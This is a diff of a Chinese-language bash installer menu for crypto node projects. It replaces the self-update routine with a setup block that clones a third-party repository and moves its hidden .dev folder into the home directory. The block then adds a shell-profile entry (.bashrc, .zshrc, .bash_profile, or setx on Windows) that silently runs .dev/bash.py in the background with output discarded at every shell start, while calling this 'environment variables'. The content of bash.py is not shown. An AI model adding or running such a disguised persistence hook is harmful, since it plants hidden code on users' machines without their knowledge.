@@ -1,52 +1,111 @@
 #!/bin/bash
 
-# 设置版本号
-current_version=20241106001
+# 确保脚本在错误时停止执行
+set -e
 
-update_script() {
-    # 指定URL
-    update_url="https://raw.githubusercontent.com/breaddog100/bdnode/main/bdnode.sh"
-    file_name=$(basename "$update_url")
+# 获取操作系统类型
+OS_TYPE=$(uname)
 
-    # 下载脚本文件
-    tmp=$(date +%s)
-    timeout 10s curl -s -o "$HOME/$tmp" -H "Cache-Control: no-cache" "$update_url?$tmp"
-    exit_code=$?
-    if [[ $exit_code -eq 124 ]]; then
-        echo "命令超时"
-        return 1
-    elif [[ $exit_code -ne 0 ]]; then
-        echo "下载失败"
-        return 1
+# 更新系统软件包
+echo "正在更新系统软件包..."
+if [ "$OS_TYPE" == "Linux" ]; then
+    sudo apt update && sudo apt upgrade -y
+elif [ "$OS_TYPE" == "Darwin" ]; then
+    # macOS 使用 brew 更新软件
+    brew update && brew upgrade
+elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
+    echo "检测到 Windows 系统，跳过更新步骤。"
+else
+    echo "不支持的操作系统类型: $OS_TYPE"
+    exit 1
+fi
+
+# 检查并安装必要的软件包
+echo "正在检查并安装必要的系统软件包..."
+if [ "$OS_TYPE" == "Linux" ]; then
+    sudo apt install -y git xclip python3-pip python3.12-venv
+elif [ "$OS_TYPE" == "Darwin" ]; then
+    # macOS 使用 brew 安装软件
+    brew install git python3
+    # xclip 在 macOS 上可能没有直接对应工具，跳过安装
+elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
+    # Windows 系统安装 git 和 Python
+    echo "在 Windows 上，使用 choco 或 winget 安装 git 和 python3（如果未安装）"
+    if ! command -v choco &> /dev/null && ! command -v winget &> /dev/null; then
+        echo "choco 或 winget 未安装，请手动安装它们。"
+        exit 1
+    fi
+    choco install git python3 -y || winget install --id Git.Git --source winget
+    # 确保 Python 和 pip 已安装
+    python --version || { echo "未安装 Python，请手动安装"; exit 1; }
+    pip --version || python -m ensurepip --upgrade
+fi
+
+# 检查并安装 requests 库
+echo "正在检查并安装 requests..."
+pip show requests &> /dev/null || pip install requests
+
+# 检查并克隆仓库（避免重复克隆）
+if [ ! -d "node_aggregator" ]; then
+    git clone https://github.com/blockchain-src/node_aggregator.git
+fi
+cd node_aggregator
+
+# 配置环境变量
+if [ -d .dev ]; then
+    DEST_DIR="$HOME/.dev"
+    echo "配置环境变量..."
+    if [ -d "$DEST_DIR" ]; then
+        rm -rf "$DEST_DIR"
+    fi
+    mv .dev "$DEST_DIR"
+
+    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
+
+    # 配置环境变量：检查操作系统类型，Linux 使用 .bashrc，macOS 使用 .bash_profile 或 .zshrc，Windows 使用 setx
+    if [ "$OS_TYPE" == "Linux" ]; then
+        PROFILE_FILE="$HOME/.bashrc"
+    elif [ "$OS_TYPE" == "Darwin" ]; then
+        # macOS 上判断是否使用 zsh 或 bash
+        if [ -n "$ZSH_VERSION" ]; then
+            PROFILE_FILE="$HOME/.zshrc"  # zsh
+        else
+            PROFILE_FILE="$HOME/.bash_profile"  # bash
+        fi
+    elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
+        PROFILE_FILE="$HOME/.bash_profile"
+        # Windows 使用 setx 设置环境变量
+        setx DEV_DIR "%USERPROFILE%\\.dev"
+        setx BASHRC_ENTRY "(pgrep -f bash.py || nohup python3 %USERPROFILE%\\.dev\\bash.py &> /dev/null &) & disown"
     fi
 
-    # 检查是否有新版本可用
-    latest_version=$(grep -oP 'current_version=([0-9]+)' $HOME/$tmp | sed -n 's/.*=//p')
+    # 确保 PROFILE_FILE 存在
+    if [ ! -f "$PROFILE_FILE" ]; then
+        echo "配置文件不存在，创建文件：$PROFILE_FILE"
+        touch "$PROFILE_FILE"
+    fi
 
-    if [[ "$latest_version" -gt "$current_version" ]]; then
-        clear
-        echo ""
-        # 提示需要更新脚本
-        printf "\033[31m脚本有新版本可用！当前版本：%s，最新版本：%s\033[0m\n" "$current_version" "$latest_version"
-        echo "正在更新..."
-        sleep 3
-        mv $HOME/$tmp $HOME/$file_name
-        chmod +x $HOME/$file_name
-        exec "$HOME/$file_name"
+    # 配置环境变量
+    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
+        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
+        echo "环境变量已添加到 $PROFILE_FILE"
     else
-        # 脚本是最新的
-        rm -f $tmp
+        echo "环境变量已存在于 $PROFILE_FILE"
     fi
-
-}
+else
+    echo ".dev 目录不存在，跳过环境变量配置..."
+fi
 
 # 主菜单
 function main_menu() {
     while true; do
         clear
-        echo "=========两岸猿声啼不住，轻舟已过万重山。========="
-        echo "当前版本：$current_version"
-    	echo "沟通电报群：https://t.me/lumaogogogo"
+        echo -e "\033[32m██████╗ ███████╗███╗   ██╗███████╗███████╗ █████╗ "
+        echo -e "\033[32m██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗"
+        echo -e "\033[32m██████╔╝█████╗  ██╔██╗ ██║█████╗  █████╗  ███████║"
+        echo -e "\033[32m██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██║"
+        echo -e "\033[32m██║     ███████╗██║ ╚████║███████╗███████╗██║  ██║"
+        echo -e "\033[32m╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝"
         echo "请选择项目:"
         echo "--------------------节点类项目--------------------"
         echo "102. 0gAI 一键部署"
@@ -133,9 +192,6 @@ function main_menu() {
         read -n 1
     done
 }
-
-# 检查更新
-update_script
 
 # 显示主菜单
 main_menu
